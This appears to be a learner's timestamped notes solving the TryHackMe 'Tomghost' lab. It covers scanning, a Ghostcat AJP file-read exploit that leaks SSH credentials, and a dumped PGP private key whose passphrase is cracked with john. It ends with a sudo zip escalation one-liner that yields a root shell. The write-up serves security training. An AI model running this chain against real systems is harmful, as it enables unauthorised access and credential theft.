```
Tomghost Attempt 1
IP: 10.10.167.119
```

```
5:06 PM 1/12/2023
nmap -sC -sV -oA nmap 10.10.167.119

																PORT     STATE SERVICE    VERSION
																22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
																| ssh-hostkey: 
																|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
																|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
																|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
																53/tcp   open  tcpwrapped
																8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
																| ajp-methods: 
																|_  Supported methods: GET HEAD POST OPTIONS
																8080/tcp open  http       Apache Tomcat 9.0.30
																|_http-title: Apache Tomcat/9.0.30
																|_http-favicon: Apache Tomcat
																|_http-open-proxy: Proxy might be redirecting requests
																Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
5:06 PM 1/12/2023

nmap -sC -sV -p- 10.10.167.119
```

```
5:17 PM 1/12/2023
dirsearch -u http://10.10.167.119:8080 -x 400,401,403

																Target: http://10.10.167.119:8080/

																[22:17:50] Starting: 
																[22:18:35] 302 -    0B  - /docs  ->  /docs/
																[22:18:36] 200 -   17KB - /docs/
																[22:18:38] 302 -    0B  - /examples  ->  /examples/
																[22:18:38] 200 -    1KB - /examples/
																[22:18:38] 200 -    6KB - /examples/servlets/index.html
																[22:18:38] 200 -  658B  - /examples/servlets/servlet/CookieExample
																[22:18:38] 200 -  947B  - /examples/servlets/servlet/RequestHeaderExample
																[22:18:39] 200 -   21KB - /favicon.ico
																[22:18:39] 200 -  678B  - /examples/jsp/snp/snoop.jsp
																[22:18:43] 200 -   11KB - /index.jsp
																[22:18:48] 302 -    0B  - /manager  ->  /manager/
```

```
5:42 PM 1/12/2023
Was doing reseach for exploits on tomcat 9.0.30, found https://github.com/Hancheng-Lei/Hacking-Vulnerability-CVE-2020-1938-Ghostcat/blob/main/CVE-2020-1938.md
in process of testing

#the one pulled off github did not work, however the one on https://www.exploit-db.com/exploits/48143


python2 CVE-2020-1938_Ghostcat.py 10.10.167.119 -f /WEB-INF/web.xml -p 8009
																			└─# python2 CVE-2020-1938_Ghostcat.py 10.10.167.119 -f /WEB-INF/web.xml -p 8009
																			Getting resource at ajp13://10.10.167.119:8009/asdf
																			----------------------------
																			<?xml version="1.0" encoding="UTF-8"?>
																			<!--
																			 Licensed to the Apache Software Foundation (ASF) under one or more
																			  contributor license agreements.  See the NOTICE file distributed with
																			  this work for additional information regarding copyright ownership.
																			  The ASF licenses this file to You under the Apache License, Version 2.0
																			  (the "License"); you may not use this file except in compliance with
																			  the License.  You may obtain a copy of the License at

																				  http://www.apache.org/licenses/LICENSE-2.0

																			  Unless required by applicable law or agreed to in writing, software
																			  distributed under the License is distributed on an "AS IS" BASIS,
																			  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
																			  See the License for the specific language governing permissions and
																			  limitations under the License.
																			-->
																			<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
																			  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
																			  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
																								  http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
																			  version="4.0"
																			  metadata-complete="true">

																			  <display-name>Welcome to Tomcat</display-name>
																			  <description>
																				 Welcome to GhostCat
																				skyfuck:8730281lkjlkjdqlksalks
																			  </description>

																			</web-app/>

worked, going to attempt ssh with skyfuck:8730281lkjlkjdqlksalks
```

```
6:02 PM 1/12/2023
 ssh skyfuck@10.10.167.119      
 
																				 └─# ssh skyfuck@10.10.167.119          
																				The authenticity of host '10.10.167.119 (10.10.167.119)' can't be established.
																				ED25519 key fingerprint is SHA256:tWlLnZPnvRHCM9xwpxygZKxaf0vJ8/J64v9ApP8dCDo.
																				This key is not known by any other names
																				Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
																				Warning: Permanently added '10.10.167.119' (ED25519) to the list of known hosts.
																				skyfuck@10.10.167.119's password: 
																				Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

																				 * Documentation:  https://help.ubuntu.com
																				 * Management:     https://landscape.canonical.com
																				 * Support:        https://ubuntu.com/advantage


																				The programs included with the Ubuntu system are free software;
																				the exact distribution terms for each program are described in the
																				individual files in /usr/share/doc/*/copyright.

																				Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
																				applicable law.

																				skyfuck@ubuntu:~$ id
																				uid=1002(skyfuck) gid=1002(skyfuck) groups=1002(skyfuck)
```

```																				skyfuck@ubuntu:~$ 
6:05 PM 1/12/2023
ssh private key

skyfuck@ubuntu:~$ cat tryhackme.asc 
																				-----BEGIN PGP PRIVATE KEY BLOCK-----
																				Version: BCPG v1.63

																				lQUBBF5ocmIRDADTwu9RL5uol6+jCnuoK58+PEtPh0Zfdj4+q8z61PL56tz6YxmF
																				3TxA9u2jV73qFdMr5EwktTXRlEo0LTGeMzZ9R/uqe+BeBUNCZW6tqI7wDw/U1DEf
																				StRTV1+ZmgcAjjwzr2B6qplWHhyi9PIzefiw1smqSK31MBWGamkKp/vRB5xMoOr5
																				ZsFq67z/5KfngjhgKWeGKLw4wXPswyIdmdnduWgpwBm4vTWlxPf1hxkDRbAa3cFD
																				B0zktqArgROuSQ8sftGYkS/uVtyna6qbF4ywND8P6BMpLIsTKhn+r2KwLcihLtPk
																				V0K3Dfh+6bZeIVam50QgOAXqvetuIyTt7PiCXbvOpQO3OIDgAZDLodoKdTzuaXLa
																				cuNXmg/wcRELmhiBsKYYCTFtzdF18Pd9cM0L0mVy/nfhQKFRGx9kQkHweXVt+Pbb
																				3AwfUyH+CZD5z74jO53N2gRNibUPdVune7pGQVtgjRrvhBiBJpajtzYG+PzBomOf
																				RGZzGSgWQgYg3McBALTlTlmXgobn9kkJTn6UG/2Hg7T5QkxIZ7yQhPp+rOOhDACY
																				hloI89P7cUoeQhzkMwmDKpTMd6Q/dT+PeVAtI9w7TCPjISadp3GvwuFrQvROkJYr
																				WAD6060AMqIv0vpkvCa471xOariGiSSUsQCQI/yZBNjHU+G44PIq+RvB5F5O1oAO
																				wgHjMBAyvCnmJEx4kBVVcoyGX40HptbyFJMqkPlXHH5DMwEiUjBFbCvXYMrOrrAc
																				1gHqhO+lbKemiT/ppgoRimKy/XrbOc4dHBF0irCloHpvnM1ShWqT6i6E/IeQZwqS
																				9GtjdqEpNZ32WGpeumBoKprMzz7RPPZPN0kbyDS6ThzhQjgBnQTr9ZuPHF49zKwb
																				nJfOFoq4GDhpflKXdsx+xFO9QyrYILNl61soYsC65hQrSyH3Oo+B46+lydd/sjs0
																				sdrSitHGpxZGT6osNFXjX9SXS9xbRnS9SAtI+ICLsnEhMg0ytuiHPWFzak0gVYuy
																				RzWDNot3s6laFm+KFcbyg08fekheLXt6412iXK/rtdgePEJfByH+7rfxygdNrcML
																				/jXI6OoqQb6aXe7+C8BK7lWC9kcXvZK2UXeGUXfQJ4Fj80hK9uCwCRgM0AdcBHh+
																				ECQ8dxop1DtYBANyjU2MojTh88vPDxC3i/eXav11YyxetpwUs7NYPUTTqMqGpvCI
																				D5jxuFuaQa3hZ/rayuPorDAspFs4iVKzR+GSN+IRYAys8pdbq+Rk8WS3q8NEauNh
																				d07D0gkSm/P3ewH+D9w1lYNQGYDB++PGLe0Tes275ZLPjlnzAUjlgaQTUxg2/2NX
																				Z7h9+x+7neyV0Io8H7aPvDDx/AotTwFr0vK5RdgaCLT1qrF9MHpKukVHL3jkozMl
																				DCI4On25eBBZEccbQfrQYUdnhy7DhSY3TaN4gQMNYeHBahgplhLpccFKTxXPjiQ5
																				8/RW7fF/SX6NN84WVcdrtbOxvif6tWN6W3AAHnyUks4v3AfVaSXIbljMMe9aril4
																				aqCFd8GZzRC2FApSVZP0QwZWyqpzq4aXesh7KzRWdq3wsQLwCznKQrayZRqDCTSE
																				Ef4JAwLI8nfS+vl0gGAMmdXa6CFvIVW6Kr/McfgYcT7j9XzJUPj4kVVnmr4kdsYr
																				vSht7Q4En4htMtK56wb0gul3DHEKvCkD8e1wr2/MIvVgh2C+tCF0cnloYWNrbWUg
																				PHN0dXhuZXRAdHJ5aGFja21lLmNvbT6IXgQTEQoABgUCXmhyYgAKCRCPPaPexnBx
																				cFBNAP9T2iXSmHSSo4MSfVeNI53DShljoNwCxQRiV2FKAfvulwEAnSplHzpTziUU
																				7GqZAaPEthfqJPQ4BgZTDEW+CD9tNuydAcAEXmhyYhAEAP//////////yQ/aoiFo
																				wjTExmKLgNwc0SkCTgiKZ8x0Agu+pjsTmyJRSgh5jjQE3e+VGbPNOkMbMCsKbfJf
																				FDdP4TVtbVHCReSFtXZiXn7G9ExC6aY37WsL/1y29Aa37e44a/taiZ+lrp8kEXxL
																				H+ZJKGZR7OZTgf//////////AAICA/9I+iaF1JFJMOBrlvH/BPbfKczlAlJSKxLV
																				90kq4Sc1orioN1omcbl2jLJiPM1VnqmxmHbr8xts4rrQY1QPIAcoZNlAIIYfogcj
																				YEF6L5YBy30dXFAxGOQgf9DUoafVtiEJttT4m/3rcrlSlXmIK51syEj5opTPsJ4g
																				zNMeDPu0PP4JAwLI8nfS+vl0gGDeKsYkGixp4UPHQFZ+zZVnRzifCJ/uVIyAHcvb
																				u2HLEF6CDG43B97BVD36JixByu30pSM+A+qD5Nj34bhvetyBQNIuE9YR2YIyXf/R
																				Uxr9P3GoDDJZfL6Hn9mQ+T9kvZQzlroWTYudyEJ6xWDlJP5QODkCZoWRYxj54Vuc
																				kaiEm1gCKVXU4qpElfr5iqK1AYRPBWt8ODk8uK/v5bPgIRIGp+6+6GIqiF4EGBEK
																				AAYFAl5ocmIACgkQjz2j3sZwcXA7AQD/cLDGGQCpQm7TC56w8t5JffvGIyZslfaS
																				dsnL+MPiD2IBALNIOKy8O1uNSDTncRSvoijW1pBusC3c5zqXuM2iwP7zmQSuBF5o
																				cmIRDADTwu9RL5uol6+jCnuoK58+PEtPh0Zfdj4+q8z61PL56tz6YxmF3TxA9u2j
																				V73qFdMr5EwktTXRlEo0LTGeMzZ9R/uqe+BeBUNCZW6tqI7wDw/U1DEfStRTV1+Z
																				mgcAjjwzr2B6qplWHhyi9PIzefiw1smqSK31MBWGamkKp/vRB5xMoOr5ZsFq67z/
																				5KfngjhgKWeGKLw4wXPswyIdmdnduWgpwBm4vTWlxPf1hxkDRbAa3cFDB0zktqAr
																				gROuSQ8sftGYkS/uVtyna6qbF4ywND8P6BMpLIsTKhn+r2KwLcihLtPkV0K3Dfh+
																				6bZeIVam50QgOAXqvetuIyTt7PiCXbvOpQO3OIDgAZDLodoKdTzuaXLacuNXmg/w
																				cRELmhiBsKYYCTFtzdF18Pd9cM0L0mVy/nfhQKFRGx9kQkHweXVt+Pbb3AwfUyH+
																				CZD5z74jO53N2gRNibUPdVune7pGQVtgjRrvhBiBJpajtzYG+PzBomOfRGZzGSgW
																				QgYg3McBALTlTlmXgobn9kkJTn6UG/2Hg7T5QkxIZ7yQhPp+rOOhDACYhloI89P7
																				cUoeQhzkMwmDKpTMd6Q/dT+PeVAtI9w7TCPjISadp3GvwuFrQvROkJYrWAD6060A
																				MqIv0vpkvCa471xOariGiSSUsQCQI/yZBNjHU+G44PIq+RvB5F5O1oAOwgHjMBAy
																				vCnmJEx4kBVVcoyGX40HptbyFJMqkPlXHH5DMwEiUjBFbCvXYMrOrrAc1gHqhO+l
																				bKemiT/ppgoRimKy/XrbOc4dHBF0irCloHpvnM1ShWqT6i6E/IeQZwqS9GtjdqEp
																				NZ32WGpeumBoKprMzz7RPPZPN0kbyDS6ThzhQjgBnQTr9ZuPHF49zKwbnJfOFoq4
																				GDhpflKXdsx+xFO9QyrYILNl61soYsC65hQrSyH3Oo+B46+lydd/sjs0sdrSitHG
																				pxZGT6osNFXjX9SXS9xbRnS9SAtI+ICLsnEhMg0ytuiHPWFzak0gVYuyRzWDNot3
																				s6laFm+KFcbyg08fekheLXt6412iXK/rtdgePEJfByH+7rfxygdNrcML/jXI6Ooq
																				Qb6aXe7+C8BK7lWC9kcXvZK2UXeGUXfQJ4Fj80hK9uCwCRgM0AdcBHh+ECQ8dxop
																				1DtYBANyjU2MojTh88vPDxC3i/eXav11YyxetpwUs7NYPUTTqMqGpvCID5jxuFua
																				Qa3hZ/rayuPorDAspFs4iVKzR+GSN+IRYAys8pdbq+Rk8WS3q8NEauNhd07D0gkS
																				m/P3ewH+D9w1lYNQGYDB++PGLe0Tes275ZLPjlnzAUjlgaQTUxg2/2NXZ7h9+x+7
																				neyV0Io8H7aPvDDx/AotTwFr0vK5RdgaCLT1qrF9MHpKukVHL3jkozMlDCI4On25
																				eBBZEccbQfrQYUdnhy7DhSY3TaN4gQMNYeHBahgplhLpccFKTxXPjiQ58/RW7fF/
																				SX6NN84WVcdrtbOxvif6tWN6W3AAHnyUks4v3AfVaSXIbljMMe9aril4aqCFd8GZ
																				zRC2FApSVZP0QwZWyqpzq4aXesh7KzRWdq3wsQLwCznKQrayZRqDCTSEEbQhdHJ5
																				aGFja21lIDxzdHV4bmV0QHRyeWhhY2ttZS5jb20+iF4EExEKAAYFAl5ocmIACgkQ
																				jz2j3sZwcXBQTQD/U9ol0ph0kqODEn1XjSOdw0oZY6DcAsUEYldhSgH77pcBAJ0q
																				ZR86U84lFOxqmQGjxLYX6iT0OAYGUwxFvgg/bTbsuQENBF5ocmIQBAD/////////
																				/8kP2qIhaMI0xMZii4DcHNEpAk4IimfMdAILvqY7E5siUUoIeY40BN3vlRmzzTpD
																				GzArCm3yXxQ3T+E1bW1RwkXkhbV2Yl5+xvRMQummN+1rC/9ctvQGt+3uOGv7Womf
																				pa6fJBF8Sx/mSShmUezmU4H//////////wACAgP/SPomhdSRSTDga5bx/wT23ynM
																				5QJSUisS1fdJKuEnNaK4qDdaJnG5doyyYjzNVZ6psZh26/MbbOK60GNUDyAHKGTZ
																				QCCGH6IHI2BBei+WAct9HVxQMRjkIH/Q1KGn1bYhCbbU+Jv963K5UpV5iCudbMhI
																				+aKUz7CeIMzTHgz7tDyIXgQYEQoABgUCXmhyYgAKCRCPPaPexnBxcDsBAP9wsMYZ
																				AKlCbtMLnrDy3kl9+8YjJmyV9pJ2ycv4w+IPYgEAs0g4rLw7W41INOdxFK+iKNbW
																				kG6wLdznOpe4zaLA/vM=
																				=dMrv
																				-----END PGP PRIVATE KEY BLOCK-----
```

```
6:05 PM 1/12/2023
skyfuck@ubuntu:/home/merlin$ cat user.txt
																				THM{GhostCat_1s_so_cr4sy}
```

```
6:25 PM 1/12/2023
unsure what to do next with keys going to look at walkthrough
```

```
6:33 PM 1/12/2023
walkthrough says to use gpg2john to decrypt and throw into new file

																					└─# gpg2john tryhackme.asc 
																					Created directory: /root/.john

																					File tryhackme.asc
																					tryhackme:$gpg$*17*54*3072*713ee3f57cc950f8f89155679abe2476c62bbd286ded0e049f886d32d2b9eb06f482e9770c710abc2903f1ed70af6fcc22f5608760be*3*254*2*9*16*0c99d5dae8216f2155ba2abfcc71f818*65536*c8f277d2faf97480:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc


going to john with rockyou.txt
```

```
6:39 PM 1/12/2023
john tryhackme --wordlist=/usr/share/wordlists/rockyou.txt  

																					─# john tryhackme --wordlist=/usr/share/wordlists/rockyou.txt  
																					Using default input encoding: UTF-8
																					Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
																					Cost 1 (s2k-count) is 65536 for all loaded hashes
																					Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
																					Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
																					Will run 4 OpenMP threads
																					Press 'q' or Ctrl-C to abort, almost any other key for status
####################################												alexandru        (tryhackme)     ########################################
																					1g 0:00:00:00 DONE (2023-01-12 23:40) 33.33g/s 35733p/s 35733c/s 35733C/s theresa..alexandru
																					Use the "--show" option to display all of the cracked passwords reliably
																					Session completed. 

```

```
6:43 PM 1/12/2023
going to use creds found on # line to decrypt pgp file, need to find out how to do that exactly...
```

```
6:58 PM 1/12/2023
so had to overwrite file on my kali box with the new cracked creds from the gpg2john portion and switch to that directory to import that file onto skyfuck box. ( file below from 6:33 pm )

																				└─# gpg2john tryhackme.asc 
																				Created directory: /root/.john

																				File tryhackme.asc
																				tryhackme:$gpg$*17*54*3072*713ee3f57cc950f8f89155679abe2476c62bbd286ded0e049f886d32d2b9eb06f482e9770c710abc2903f1ed70af6fcc22f5608760be*3*254*2*9*16*0c99d5dae8216f2155ba2abfcc71f818*65536*c8f277d2faf97480:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc
```

```
7:03 PM 1/12/2023
imported new tryhackme.asc file

																				skyfuck@ubuntu:~$ gpg --import tryhackme.asc 
																				gpg: key C6707170: secret key imported
																				gpg: /home/skyfuck/.gnupg/trustdb.gpg: trustdb created
																				gpg: key C6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
																				gpg: key C6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
																				gpg: Total number processed: 2
																				gpg:               imported: 1
																				gpg:              unchanged: 1
																				gpg:       secret keys read: 1
																				gpg:   secret keys imported: 1
```

```
7:07 PM 1/12/2023
decrypted credential.pgp with imported tryhackme.asc file. - used credentials alexandru from before.

																			skyfuck@ubuntu:~$ gpg --decrypt credential.pgp 

																			You need a passphrase to unlock the secret key for
																			user: "tryhackme <stuxnet@tryhackme.com>"
																			1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)

																			gpg: gpg-agent is not available in this session
																			gpg: Invalid passphrase; please try again ...

																			You need a passphrase to unlock the secret key for
																			user: "tryhackme <stuxnet@tryhackme.com>"
																			1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)

																			gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
																			gpg: encrypted with 1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11
																				  "tryhackme <stuxnet@tryhackme.com>"
																			merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

```																			
7:08 PM 1/12/2023
going to try to ssh in. - box died, restarting tomghost...
NEW IP: 10.10.222.255
ssh merlin@10.10.222.255
on box with creds, new ip because had to restart vm.

																			└─# ssh merlin@10.10.222.255  
																			The authenticity of host '10.10.222.255 (10.10.222.255)' can't be established.
																			ED25519 key fingerprint is SHA256:tWlLnZPnvRHCM9xwpxygZKxaf0vJ8/J64v9ApP8dCDo.
																			This host key is known by the following other names/addresses:
																				~/.ssh/known_hosts:4: [hashed name]
																			Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
																			Warning: Permanently added '10.10.222.255' (ED25519) to the list of known hosts.
																			merlin@10.10.222.255's password: 
																			Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

																			 * Documentation:  https://help.ubuntu.com
																			 * Management:     https://landscape.canonical.com
																			 * Support:        https://ubuntu.com/advantage

																			Last login: Tue Mar 10 22:56:49 2020 from 192.168.85.1
																			merlin@ubuntu:~$ 
```

```
7:14 PM 1/12/2023
sudo -l

																	merlin@ubuntu:~$ sudo -l
																	Matching Defaults entries for merlin on ubuntu:
																		env_reset, mail_badpass,
																		secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

																	User merlin may run the following commands on ubuntu:
																		(root : root) NOPASSWD: /usr/bin/zip
																	merlin@ubuntu:~$ 
```

```
7:17 PM 1/12/2023
GTFOBINS zip privilege escalation page, https://gtfobins.github.io/gtfobins/zip/#sudo

																	TF=$(mktemp -u)
																	sudo zip $TF /etc/hosts -T -TT 'sh #'
																	sudo rm $TF
```

```																	
7:18 PM 1/12/2023
																	merlin@ubuntu:~$ TF=$(mktemp -u)
																	merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
																	  adding: etc/hosts (deflated 31%)
																	# ls
																	user.txt
																	# whoami
																	root
																	# id
																	uid=0(root) gid=0(root) groups=0(root)
																	# 
																	
gained root access.


fairly simple box, only needed help with the whole gpg decryption and .asc importing - first time seeing that stuff.

FLAGS:
root.txt: THM{Z1P_1S_FAKE}
user.txt: THM{GhostCat_1s_so_cr4sy}
```
